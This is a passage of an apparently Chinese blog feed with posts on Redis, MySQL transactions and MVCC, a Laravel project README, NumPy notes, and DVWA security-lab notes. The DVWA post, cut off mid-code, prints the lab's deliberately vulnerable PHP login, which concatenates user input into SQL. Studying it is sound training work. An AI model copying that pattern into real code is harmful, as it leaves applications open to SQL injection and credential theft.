title="性能测试"></a>性能测试</h1><p>Redis-benchmarkr</p>]]></content>
      
      
      <categories>
          
          <category> Redis </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redis </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>MySQL架构与基本特性</title>
      <link href="/2018/07/02/MySQL%E6%9E%B6%E6%9E%84%E4%B8%8E%E5%9F%BA%E6%9C%AC%E7%89%B9%E6%80%A7/"/>
      <url>/2018/07/02/MySQL%E6%9E%B6%E6%9E%84%E4%B8%8E%E5%9F%BA%E6%9C%AC%E7%89%B9%E6%80%A7/</url>
      
        <content type="html"><![CDATA[<p>MySQL作为web开发最常用的数据库，有必要了解MySQL，如果能在头脑中构建一副MySQL各组件如何协同工作的架构图，就会有有助于我们更好地使用MySQL<br><a id="more"></a></p><h1 id="MySQL逻辑架构"><a href="#MySQL逻辑架构" class="headerlink" title="MySQL逻辑架构"></a>MySQL逻辑架构</h1><p><img src="jiagou.jpg" alt="逻辑架构图"></p><ul><li><p>最上层的服务并不是MySQL所独有的，但大多数基于网络的客户端/服务器的工具或者服务都有类似的，比如链接处理，授权认证，安全</p></li><li><p>核心服务，包括查询解析，分析，优化，缓存，存储过程，触发器，视图</p></li><li><p>存储引擎，存储引擎负责MySQL中数据的存储和提取</p></li></ul><h2 id="并发控制"><a href="#并发控制" class="headerlink" title="并发控制"></a>并发控制</h2><h3 id="锁"><a href="#锁" class="headerlink" title="锁"></a>锁</h3><p>无论何时，只要有多个查询需要在同一时刻修改数据，都会产生并发控制的问题。在解决并发读或者写的时候，可以通过实现一个有两种类型的锁组成的锁系统来解决问题，这两种类型的被称为共享锁和排他锁也叫读锁和写锁</p><ul><li>读锁是共享的，或者说相互不阻塞的，多个客户在同一时刻可以同时读取同一个资源，互相不干扰</li><li>写锁是排他的，一个写锁会阻塞其他的写锁和读锁，这是出于安全策略的考虑，只有这样子，才能确保在给定的时间内，只有一个用户执行写入，并且防止其他用户读取正在写入的同一资源</li></ul><h3 id="锁粒度"><a href="#锁粒度" class="headerlink" title="锁粒度"></a>锁粒度</h3><p>一种提高共享资源并发性的方式就是让锁定对象更具有选择性，尽量之锁定需要修改的部分数据，而不是所有的资源，更理想的情况下，只会对修改的数据骗进行精确的锁定，任何时候，在给定的资源上，锁定的数据量越好啊，则系统的并发成都越高，只要相互之间不发声冲突即可</p><p>加锁也消耗资源，锁的各种操作，包括获得锁，检查锁是否已经解除，释放锁等，都会增加系统的开销</p><p>锁策略，就是在锁的开销和数据的安全性寻求平衡</p><ul><li>表锁是MySQL中最基本的锁策略，并且是开销最小的策略，</li><li>行级锁可以最大程度地支持并发处理（同时也带来了最大的锁开销）</li></ul><h2 id="事务"><a href="#事务" class="headerlink" title="事务"></a>事务</h2><h3 id="什么是事务"><a href="#什么是事务" class="headerlink" title="什么是事务"></a>什么是事务</h3><p>事务就是一组原子性的SQL查询或者说一个独立的工作单元，事务内的语句，要么全部执行成功，要么全部执行失败</p><p>一个运行良好的事务处理系统，必须具备这么标准特征</p><ul><li><p>原子性<br>：一个事务必须被视为一个不可分割的最小工作单元，整个事务中的所有操作要么提交成功，要么全部失败回滚</p></li><li><p>一致性<br>：数据库总是从一个一致性的状态转换到另外一个一致性的状态</p></li><li><p>隔离性<br>：通常来说，一个事务所做的修改在提交以前，对其他事务是不可兼得</p></li><li><p>持久性<br>：一旦事务提交，则器所做的修改就会永久保存到数据库中</p></li></ul><h3 id="事务隔离级别"><a href="#事务隔离级别" class="headerlink" title="事务隔离级别"></a>事务隔离级别</h3><p>在上述，我们说过，通常情况下，一个事务所做的修改在提交以前对其他的事务是不可见的，但是隔离性其实比想像的要复杂，在SQL标准中定义了死忠隔离级别，每一种级别都规定了一个事务中所做的修改，哪些在事务内和事务见是可见的，哪些是不可见的</p><ul><li><p>READ UNCOMMITED (未提交读)<br>在这个级别中，事务中的修改，及时没有提交，对其他事务也是可见的，事务可以读取未提交的数据，这也被称为脏读</p></li><li><p>READ COMMMITED(提交读)<br>大多数系统默认的隔离级别都是这个级别，但是MySQL不是，一个事务开始时，只能看见已提交的事务所做的修改，也叫做不可重复读</p></li><li><p>REPEATABLE READ(可重复读)<br>解决了脏读的问题，该级别保证了在同一个事务中多次读取同样记录的结果是一致的，但是可重复读无法解决另外一个幻读的问题，所谓幻读，指的是某个事务在读取某个范围内的记录时，另外一个事务又在该范围内插入了新的记录，当之前的事务再次读取该范围的记录时，会产生幻行<br>也是MySQL的默认事务隔离级别</p></li><li><p>SERIALIZABLE（可串行化）<br>解决了幻读问题，在读取的每一行数据上都加锁，所以可能导致大量的超时和锁争用的问题</p></li></ul><h3 id="死锁"><a href="#死锁" class="headerlink" title="死锁"></a>死锁</h3><p>死锁指两个或者多个事务在统一资源上相互占用，并请求锁定对方的资源，从而导致恶性循环的现象，当多个事务试图以不同的顺序固定资源时，就可能产生死锁，多个事务同时锁定同一个资源时也会产生死锁。</p><p>为了解决这种问题，数据库系统实现了各种死锁检测和死锁超时机制</p><p>InnoDB目前处理死锁的方式，将持有最少行级排塔索的事务进行回滚。</p><h3 id="MySQL中的事务"><a href="#MySQL中的事务" class="headerlink" title="MySQL中的事务"></a>MySQL中的事务</h3><p>MySQL比较常见的两种事务型的存储引擎InnoDB和NDB Cluster</p><ul><li><p>自动提交，MySQL默认采用自动提交模式，如果不是显式的开始一个事务，则每个查询都被当做一个事务执行提交操作<br>set AUTOCOMMIT=0表示需要手动提交，但是有一些命令，在执行之前会强制执行COMMIT提交当前的活动事务，比如ALTER TABLE,LOCK TABLES</p></li><li><p>可以通过SET SESSION TRANSACTION ISOLATION LEVEL READ COMMITED</p></li><li><p>隐式和显式锁定<br>隐式锁定：<br>InnoDB采用的是两阶段锁定协议，就是说在事务执行过程中买随时都可以执行锁定，只有在执行COMMIT和ROLLBACK的时候才会被释放</p></li></ul><p>显式锁定：<br>SELECT …LOCK IN SHARE MODE<br>SELECT … FOR UPDATE<br>LOCK TABLES UNlocktables 这是在服务器层实现的，与存储引擎无关一般不建议使用</p><h2 id="多版本并发控制"><a href="#多版本并发控制" class="headerlink" title="多版本并发控制"></a>多版本并发控制</h2><p>MySQL的大多数事务型存储引擎实现的都不是简单的行级锁，基于提升并发性能的考虑，它们一般同时实现了多版本并发控制(MVCC)</p><p>可以认为MVCC是行级锁的一个变种。实现原理是通过保存数据在某个时间点的快照来实现，也就是说，不管需要执行多长时间，每个事务看到的数据都是一致的。</p><p>可分为乐观并发控制和悲观并发控制。</p><p>InnoDB的MVCC工作流程:<br>通过在每行记录后面保存两个隐藏的列来实现的，一列保存了行的创建时间，一个保存行的过期时间，存储的并不是时间值，而是系统版本号，没开始一个新的事物，系统版本都会自动递增</p><p>REPEATABLE READ隔离级别下,MVCC具体的操作</p><ul><li><p>SELECT<br>a.InnoDB只查找版本早于当前事务版本的数据行，这样可以确保事务读取的行，要么是在事务开始前存在的，要么是事务自身插入或者修改过的<br>b.行的创建版本要么未定义，要么大于当前事务版本号，</p></li><li><p>Insert<br>InnoDB为新插入的每一行保存当前系统版本号为行版本号</p></li><li><p>Delete<br>InnoDB为新插入的每一行保存当前系统版本号为行删除标识</p></li><li><p>UPDATE<br>InnoDB为插入的每一行保存当前系统版本号为行版本号,保存当前系统版本号为行删除标识</p></li></ul><p>保存这两个额外的版本号，使大多数操作都可以不用加锁。不足之处是每行记录都需要额外的存储空间.</p><p>MVCC只在REPEATABLE READ 和 READ COMMITED 两个隔离级别下工作</p>]]></content>
      
      
      <categories>
          
          <category> mysql </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>基于laravel5.5开发的个人知识付费博客</title>
      <link href="/2018/06/13/%E5%9F%BA%E4%BA%8Elaravel5-5%E5%BC%80%E5%8F%91%E7%9A%84%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E4%BB%98%E8%B4%B9%E5%8D%9A%E5%AE%A2/"/>
      <url>/2018/06/13/%E5%9F%BA%E4%BA%8Elaravel5-5%E5%BC%80%E5%8F%91%E7%9A%84%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E4%BB%98%E8%B4%B9%E5%8D%9A%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<p>该项目整合了laravel-china入门，进阶，api第三方登陆，电商教程的部分功能模块，参考了laravel-china前身开源的phphub样式，打造了一个可以互动的社区论坛模块以及支持付费阅读的的个人博客，本系统有以下几个角色。<br><a id="more"></a></p><h2 id="1-角色"><a href="#1-角色" class="headerlink" title="1.角色"></a>1.角色</h2><p>在larabbs里会出现以下角色：</p><p>游客——没有登录的用户<br>用户——github,邮箱微信注册用户，可以进行论坛发布讨论，可以购买需要付费的笔记进行阅读<br>管理员，站长——辅助站长做内容管理，笔记创建，广告位设置，论坛内容管理，用户管理，其他展示页的管理</p><h2 id="2-信息结构"><a href="#2-信息结构" class="headerlink" title="2.信息结构"></a>2.信息结构</h2><p>主要信息有：</p><p>笔记 note——章节属于一个笔记，一个笔记可以多个章节，可以设置是否付费和金额<br>章节 chapter——笔记章节，一个章节可以有多个文章<br>用户 User——所有内容都围绕用户来进行，采用github,邮箱微信自动登录方式验证<br>文章 article——本博客系统的核心数据，支持markdown，博客管理员可以选择笔记和章节发布文章<br>订单 Order——用户购买书本的凭证<br>话题 Topic，LaraBBS 论坛应用的最核心数据，有时我们称为帖子；<br>分类 Category，话题的分类，每一个话题必须对应一个分类，分类由管理员创建；<br>回复  Reply，针对某个话题的讨论，一个话题下可以有多个回复。<br>消息通知 Notice——向用户反馈信息<br>广告 Advertising——在首页进行展示</p><h2 id="3-动作"><a href="#3-动作" class="headerlink" title="3.动作"></a>3.动作</h2><p>角色和信息之间的互动称为动作，主要有以下几种：</p><ul><li>用户注册、用户第三方登陆</li><li>用户创建话题</li><li>用户回复话题</li><li>管理员选择笔记，章节发布文章</li><li>用户创建订单支付</li><li>用户有权限访问文章</li><li>管理员设置资源推荐，广告位设置</li></ul><h1 id="关于项目"><a href="#关于项目" class="headerlink" title="关于项目"></a>关于项目</h1><p>具体可移步 <a href="http://xhz-xed.org/" target="_blank" rel="noopener">http://xhz-xed.org/</a></p><p><img src="http://p7gqfr2rf.bkt.clouddn.com/article.png" alt="文章"><br><img src="http://p982sr293.bkt.clouddn.com/bugshow.png" alt="支付"><br><img src="http://p982sr293.bkt.clouddn.com/projectshow.png" alt="项目"><br><img src="http://p982sr293.bkt.clouddn.com/ordershow.png" alt="订单"><br><img src="http://p982sr293.bkt.clouddn.com/lifeshow.png" alt="生活"><br><img src="http://p982sr293.bkt.clouddn.com/homeshow.png" alt="首页"><br><img src="http://p982sr293.bkt.clouddn.com/noteshow.png" alt="笔记"><br><img src="http://p7gqfr2rf.bkt.clouddn.com/articleshow.png" alt="文章"><br><img src="http://p7gqfr2rf.bkt.clouddn.com/ordermanage.png" alt="订单管理"></p><h3 id="还需开发功能"><a href="#还需开发功能" class="headerlink" title="还需开发功能"></a>还需开发功能</h3><p>基于laravel5.5开发</p><ul><li style="list-style: none"><input type="checkbox" checked> 全栈帖子搜索功能</li><li style="list-style: none"><input type="checkbox"> 用户关注功能</li><li style="list-style: none"><input type="checkbox"> 实现 @某个人 功能</li><li style="list-style: none"><input type="checkbox" checked> 增加第三方登陆</li><li style="list-style: none"><input type="checkbox"> 七牛上传图片(现在后台广告资源图片需要自己手动输入七牛的链接，后续再更改吧)</li></ul><h2 id="怎么使用源码"><a href="#怎么使用源码" class="headerlink" title="怎么使用源码"></a>怎么使用源码</h2><h3 id="线上环境部署，参考部署指南"><a href="#线上环境部署，参考部署指南" class="headerlink" title="线上环境部署，参考部署指南"></a>线上环境部署，参考<a href="http://xhz-xed.org/articles/4" target="_blank" rel="noopener">部署指南</a></h3><p>注意：</p><ul><li>Master中不是该项目的源码，请切换到xhz-xed分支进行clone</li><li>源码仅做学习</li><li>开发环境参考<a href="https://laravel-china.org/docs/laravel-development-environment/5.5" target="_blank" rel="noopener">Laravel开发环境部署</a></li><li>git clone <a href="https://github.com/shisiying/Laravel-bbs" target="_blank" rel="noopener">https://github.com/shisiying/Laravel-bbs</a></li></ul><p>详细操作请按照以下</p><p> 运行环境要求</p><ul><li>Nginx 1.8+</li><li>PHP 7.1+</li><li>Mysql 5.7+</li><li>Redis 3.0+</li><li>Memcached 1.4+</li></ul><h3 id="开发环境部署-安装"><a href="#开发环境部署-安装" class="headerlink" title="开发环境部署/安装"></a>开发环境部署/安装</h3><p>本项目代码使用 PHP 框架 <a href="https://d.laravel-china.org/docs/5.5/" target="_blank" rel="noopener">Laravel 5.5</a> 开发，本地开发环境使用 <a href="https://d.laravel-china.org/docs/5.5/homestead" target="_blank" rel="noopener">Laravel Homestead</a>。</p><p>下文将在假定读者已经安装好了 Homestead 的情况下进行说明。如果您还未安装 Homestead，可以参照 <a href="https://laravel-china.org/docs/5.5/homestead#installation-and-setup" target="_blank" rel="noopener">Homestead 安装与设置</a> 进行安装配置。</p><h4 id="基础安装"><a href="#基础安装" class="headerlink" title="基础安装"></a>基础安装</h4><h5 id="1-克隆源代码"><a href="#1-克隆源代码" class="headerlink" title="1. 克隆源代码"></a>1. 克隆源代码</h5><p>克隆 <code>larabbs</code> 源代码到本地：</p><pre><code>&gt; git clone git@github.com:summerblue/larabbs.git</code></pre><h5 id="2-配置本地的-Homestead-环境"><a href="#2-配置本地的-Homestead-环境" class="headerlink" title="2. 配置本地的 Homestead 环境"></a>2. 配置本地的 Homestead 环境</h5><p>1). 运行以下命令编辑 Homestead.yaml 文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">homestead edit</span><br></pre></td></tr></table></figure><p>2). 加入对应修改，如下所示：</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">folders:</span></span><br><span class="line">    - map: ~<span class="meta-keyword">/my-path/</span>larabbs/ <span class="meta"># 你本地的项目目录地址</span></span><br><span class="line"><span class="symbol">      to:</span> <span class="meta-keyword">/home/</span>vagrant/larabbs</span><br><span class="line"></span><br><span class="line"><span class="symbol">sites:</span></span><br><span class="line">    - map: larabbs.test</span><br><span class="line"><span class="symbol">      to:</span> <span class="meta-keyword">/home/</span>vagrant<span class="meta-keyword">/larabbs/</span>public</span><br><span class="line"></span><br><span class="line"><span class="symbol">databases:</span></span><br><span class="line">    - larabbs</span><br></pre></td></tr></table></figure><p>3). 应用修改</p><p>修改完成后保存，然后执行以下命令应用配置信息修改：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">homestead provision</span><br></pre></td></tr></table></figure><p>随后请运行 <code>homestead reload</code> 进行重启。</p><h5 id="3-安装扩展包依赖"><a href="#3-安装扩展包依赖" class="headerlink" title="3. 安装扩展包依赖"></a>3. 安装扩展包依赖</h5><pre><code>composer install</code></pre><h5 id="4-生成配置文件"><a href="#4-生成配置文件" class="headerlink" title="4. 生成配置文件"></a>4. 生成配置文件</h5><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">cp</span> <span class="selector-class">.env</span><span class="selector-class">.example</span> <span class="selector-class">.env</span></span><br></pre></td></tr></table></figure><p>你可以根据情况修改 <code>.env</code> 文件里的内容，如数据库连接、缓存、邮件设置等。</p><h5 id="5-生成秘钥"><a href="#5-生成秘钥" class="headerlink" title="5. 生成秘钥"></a>5. 生成秘钥</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php artisan key:generate</span><br></pre></td></tr></table></figure><h5 id="6-生成数据表及生成测试数据"><a href="#6-生成数据表及生成测试数据" class="headerlink" title="6. 生成数据表及生成测试数据"></a>6. 生成数据表及生成测试数据</h5><p>在 Homestead 的网站根目录下运行以下命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> php artisan migrate --seed</span></span><br></pre></td></tr></table></figure><p>初始的用户角色权限已使用数据迁移生成。</p><h5 id="7-配置-hosts-文件"><a href="#7-配置-hosts-文件" class="headerlink" title="7. 配置 hosts 文件"></a>7. 配置 hosts 文件</h5><pre><code>echo &quot;192.168.10.10   larabbs.test&quot; | sudo tee -a /etc/hosts</code></pre><h4 id="前端框架安装"><a href="#前端框架安装" class="headerlink" title="前端框架安装"></a>前端框架安装</h4><p>1). 安装 node.js</p><p>直接去官网 <a href="https://nodejs.org/en/" target="_blank" rel="noopener">https://nodejs.org/en/</a> 下载安装最新版本。</p><p>2). 安装 Yarn</p><p>请按照最新版本的 Yarn —— <a href="http://yarnpkg.cn/zh-Hans/docs/install" target="_blank" rel="noopener">http://yarnpkg.cn/zh-Hans/docs/install</a></p><p>3). 安装 Laravel Mix</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yarn install</span><br></pre></td></tr></table></figure><p>4). 编译前端内容</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// 运行所有 Mix 任务...</span><br><span class="line">npm run dev</span><br><span class="line"></span><br><span class="line">// 运行所有 Mix 任务并缩小输出..</span><br><span class="line">npm run production</span><br></pre></td></tr></table></figure><p>5). 监控修改并自动编译</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">npm run watch</span><br><span class="line"></span><br><span class="line">// 在某些环境中，当文件更改时，Webpack 不会更新。如果系统出现这种情况，请考虑使用 watch-poll 命令：</span><br><span class="line">npm run watch-poll</span><br></pre></td></tr></table></figure><h4 id="链接入口"><a href="#链接入口" class="headerlink" title="链接入口"></a>链接入口</h4><ul><li>首页地址：<a href="http://larabbs.test/" target="_blank" rel="noopener">http://larabbs.test/</a></li><li>管理后台：<a href="http://larabbs.test/admin" target="_blank" rel="noopener">http://larabbs.test/admin</a></li></ul><p>管理员账号密码如下:</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">username</span>: <span class="number">751401459</span><span class="variable">@qq</span>.com</span><br><span class="line"><span class="attribute">password</span>: password</span><br></pre></td></tr></table></figure><p>至此, 安装完成 ^_^。</p><h4 id="扩展包使用情况"><a href="#扩展包使用情况" class="headerlink" title="扩展包使用情况"></a>扩展包使用情况</h4><table><thead><tr><th>扩展包</th><th>一句话描述</th><th>本项目应用场景</th></tr></thead><tbody><tr><td><a href="https://github.com/Intervention/image" target="_blank" rel="noopener">Intervention/image</a></td><td>图片处理功能库</td><td>用于图片裁切</td></tr><tr><td><a href="https://github.com/guzzle/guzzle" target="_blank" rel="noopener">guzzlehttp/guzzle</a></td><td>HTTP 请求套件</td><td>请求百度翻译 API</td></tr><tr><td><a href="https://github.com/nrk/pRedis.git" target="_blank" rel="noopener">pRedis/pRedis</a></td><td>Redis 官方首推的 PHP 客户端开发包</td><td>缓存驱动 Redis 基础扩展包</td></tr><tr><td><a href="https://github.com/barryvdh/laravel-debugbar" target="_blank" rel="noopener">barryvdh/laravel-debugbar</a></td><td>页面调试工具栏 (对 phpdebugbar 的封装)</td><td>开发环境中的 DEBUG</td></tr><tr><td><a href="https://github.com/spatie/laravel-permission" target="_blank" rel="noopener">spatie/laravel-permission</a></td><td>角色权限管理</td><td>角色和权限控制</td></tr><tr><td><a href="https://github.com/mewebstudio/Purifier" target="_blank" rel="noopener">mewebstudio/Purifier</a></td><td>用户提交的 Html 白名单过滤</td><td>帖子内容的 Html 安全过滤，防止 XSS 攻击</td></tr><tr><td><a href="https://github.com/letrunghieu/active" target="_blank" rel="noopener">hieu-le/active</a></td><td>选中状态</td><td>顶部导航栏选中状态</td></tr><tr><td><a href="https://github.com/summerblue/administrator" target="_blank" rel="noopener">summerblue/administrator</a></td><td>管理后台</td><td>模型管理后台、配置信息管理后台</td></tr><tr><td><a href="https://github.com/viacreative/sudo-su" target="_blank" rel="noopener">viacreative/sudo-su</a></td><td>用户切换</td><td>开发环境中快速切换登录账号</td></tr><tr><td><a href="https://github.com/laravel/horizon" target="_blank" rel="noopener">laravel/horizon</a></td><td>队列监控</td><td>队列监控命令与页面控制台 /horizon</td></tr><tr><td><a href="https://socialiteproviders.github.io/" target="_blank" rel="noopener">laravel/socialite</a></td><td>第三方登陆库</td><td>微信，github登陆</td></tr><tr><td><a href="https://github.com/yansongda/laravel-pay" target="_blank" rel="noopener">yansongda/pay</a></td><td>第三方支付</td><td>支付宝微信支付</td></tr></tbody></table><h4 id="自定义-Artisan-命令"><a href="#自定义-Artisan-命令" class="headerlink" title="自定义 Artisan 命令"></a>自定义 Artisan 命令</h4><table><thead><tr><th>命令行名字</th><th>说明</th><th>Cron</th><th>代码调用</th></tr></thead><tbody><tr><td><code>larabbs:calculate-active-user</code></td><td>生成活跃用户</td><td>一小时运行一次</td><td>无</td></tr><tr><td><code>larabbs:sync-user-actived-at</code></td><td>从 Redis 中同步最后登录时间到数据库中</td><td>每天早上 0 点准时</td><td>无</td></tr></tbody></table><h4 id="队列清单"><a href="#队列清单" class="headerlink" title="队列清单"></a>队列清单</h4><table><thead><tr><th>名称</th><th>说明</th><th>调用时机</th></tr></thead><tbody><tr><td>TranslateSlug.php</td><td>将话题标题翻译为 Slug</td><td>TopicObserver 事件 saved()</td></tr><tr><td>TopicReplied.php</td><td>通知作者话题有新回复</td><td>话题被评论以后</td></tr></tbody></table><h4 id="License"><a href="#License" class="headerlink" title="License"></a>License</h4><p>The Laravel framework is open-sourced software licensed under the <a href="https://opensource.org/licenses/MIT" target="_blank" rel="noopener">MIT license</a>.</p>]]></content>
      
      
      <categories>
          
          <category> 项目 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>利用python进行数据分析</title>
      <link href="/2018/03/16/%E5%88%A9%E7%94%A8python%E8%BF%9B%E8%A1%8C%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90/"/>
      <url>/2018/03/16/%E5%88%A9%E7%94%A8python%E8%BF%9B%E8%A1%8C%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p>之前看了《Python网络数据采集》，自己也实践了很多数据爬虫，发现数据抓取不是主要的，分析数据的价值才是最主要的，因此阅读这本《利用python进行数据分析》，以下这篇文章都是这篇文章的笔记，也方便自己细读和后续查找资料，我发现，很多情况下，我都会翻阅之前做的笔记。<br><a id="more"></a></p><p>对于大部分数据分析应用而言，最常关注的功能主要集中在</p><ul><li>用于数据整理和清理，自己构造和过滤，转换等快速的矢量化数组运算</li><li>常用的数组算法，如排序，唯一化，集合运算</li><li>高校的描述统计和数据聚合摘要运算</li><li>用于异构数据集的合并、连接运算的数据对齐和关系型数据运算</li><li>将条件逻辑表述为数组表达式</li><li>数组的分组运算（聚合，转换，函数应用）</li></ul><p>以下，我们聚焦上述这些点，学习一些工具的使用</p><h2 id="NumPy基础：数组和矢量计算"><a href="#NumPy基础：数组和矢量计算" class="headerlink" title="NumPy基础：数组和矢量计算"></a>NumPy基础：数组和矢量计算</h2><p>NumPy Numerical Python是高性能科学计算和数据分析的基础跑，是其他高级工具的构建基础，主要功能</p><ul><li>ndarray，一个具有矢量算数运算和复杂广播能力的快速且节省空间的多维数组</li><li>无需编写循环，用于对整组数据进行快速运算的标准函数</li><li>用于读写磁盘数据的工具以及用于操作内存映射文件的工具</li><li>线性代数，随机数生成以及傅里叶变换功能</li></ul><h3 id="NumPy的ndarray：一种多维数组对象"><a href="#NumPy的ndarray：一种多维数组对象" class="headerlink" title="NumPy的ndarray：一种多维数组对象"></a>NumPy的ndarray：一种多维数组对象</h3><blockquote><p>ndarray是一个通用的同构数据多维容器，所有元素是相同类型的，每个数组都有shape(各维度大小的元素)和dtype(说明数组数据类型的对象)</p></blockquote><h4 id="创建方法："><a href="#创建方法：" class="headerlink" title="创建方法："></a>创建方法：</h4><p><img src="numpy01.png" alt=""></p><h4 id="ndarray数据类型"><a href="#ndarray数据类型" class="headerlink" title="ndarray数据类型"></a>ndarray数据类型</h4><p><img src="numpy02.png" alt=""><br><img src="numpy03.png" alt=""><br>可通过在创建初始化或者使用astype进行格式转换如：<br>np.array([‘1’,’2’,’3’],dtype=np.string)</p><h4 id="数组和标量之间的运算"><a href="#数组和标量之间的运算" class="headerlink" title="数组和标量之间的运算"></a>数组和标量之间的运算</h4><p>numpy中的数组很重要，因为可以编写循环即可对数据执行批量运算，这通常叫做矢量化，如<br><img src="numpy04.png" alt=""></p><ul><li>索引和切片</li></ul><p>一维数组切片:</p><p>与python列表的区别：数组切片是原始数组的视图，视图上的任何修改都会直接反应到源数组上，这意味着数据不会被复制，因为numpy的设计目的是处理大数据，因此，如果数据复制来复制去的话会产生何等的性能和内存难问题</p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>DVWA学习笔记</title>
      <link href="/2018/02/02/DVWA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2018/02/02/DVWA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>前面一篇文章我们知道了OWAS给出的十大漏洞，那么我们今天继续学习怎么进一步的学习了解以及在日常开发中怎么防范这些漏洞<br>话说不知道没有学习过web安全的同学看到标题又一脸懵逼了，什么叫做DVWA呢，那么本文章继续梳理下知识点。<br><a id="more"></a></p><h2 id="DVWA简介"><a href="#DVWA简介" class="headerlink" title="DVWA简介"></a>DVWA简介</h2><h3 id="DVWA"><a href="#DVWA" class="headerlink" title="DVWA"></a>DVWA</h3><blockquote><p>DVWA（Damn Vulnerable Web Application）是一个用来进行安全脆弱性鉴定的PHP/MySQL Web应用，旨在为安全专业人员测试自己的专业技能和工具提供合法的环境，帮助web开发者更好的理解web应用安全防范的过程。</p></blockquote><p>简单点说就是帮你来学习web安全的一个应用，你在上面可以审计代码并且练习怎么防范这些漏洞，听起来很厉害的样子。</p><h3 id="功能模块"><a href="#功能模块" class="headerlink" title="功能模块"></a>功能模块</h3><blockquote><p>Brute Force（暴力（破解））<br> Command Injection（命令行注入）<br> CSRF（跨站请求伪造）<br> File Inclusion（文件包含）<br> File Upload（文件上传）<br> Insecure CAPTCHA （不安全的验证码）<br> SQL Injection（SQL注入）<br> SQL Injection（Blind）（SQL盲注）<br> XSS（Reflected）（反射型跨站脚本）<br> XSS（Stored）（存储型跨站脚本）</p></blockquote><h3 id="新版本"><a href="#新版本" class="headerlink" title="新版本"></a>新版本</h3><p>现在目前最新版本是1.9版本，新版本有四种安全级别，分别是Low，Medium，High，Impossible。初学者可以通过比较四种级别的代码，接触到一些PHP代码审计的内容。</p><h2 id="Brute-Force"><a href="#Brute-Force" class="headerlink" title="Brute Force"></a>Brute Force</h2><p>Brute Force，即暴力（破解），是指黑客利用密码字典，使用穷举法猜解出用户口令，是现在最为广泛使用的攻击手法之一，如2014年轰动全国的12306“撞库”事件，实质就是暴力破解攻击。<br>在DVWA下的界面是这样子的，如下所示:<br><img src="brute01.png" alt=""></p><p>暴力破解也是我们经常通道的攻击手法了，接下看下每个级别下的代码进行审计分析下</p><h3 id="LOW"><a href="#LOW" class="headerlink" title="LOW"></a>LOW</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">'Login'</span>]))&#123;</span><br><span class="line">//Getusername</span><br><span class="line"><span class="variable">$user</span>=<span class="variable">$_GET</span>[<span class="string">'username'</span>];</span><br><span class="line"></span><br><span class="line">//Getpassword</span><br><span class="line"><span class="variable">$pass</span>=<span class="variable">$_GET</span>[<span class="string">'password'</span>];</span><br><span class="line"><span class="variable">$pass</span>=md5(<span class="variable">$pass</span>);</span><br><span class="line"></span><br><span class="line">//Checkthedatabase</span><br><span class="line"><span class="variable">$query</span>=<span class="string">"SELECT*FROM`users`WHEREuser='<span class="variable">$user</span>'ANDpassword='<span class="variable">$pass</span>';"</span>;</span><br><span class="line"><span class="variable">$result</span>=mysql_query(<span class="variable">$query</span>)ordie(<span class="string">'&lt;pre&gt;'</span>.mysql_error().<span class="string">'&lt;/pre&gt;'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span>&amp;&amp;mysql_num_rows(<span class="variable">$result</span>)==1)&#123;</span><br><span class="line">//Getusersdetails</span><br><span class="line"><span class="variable">$avatar</span>=mysql_result(<span 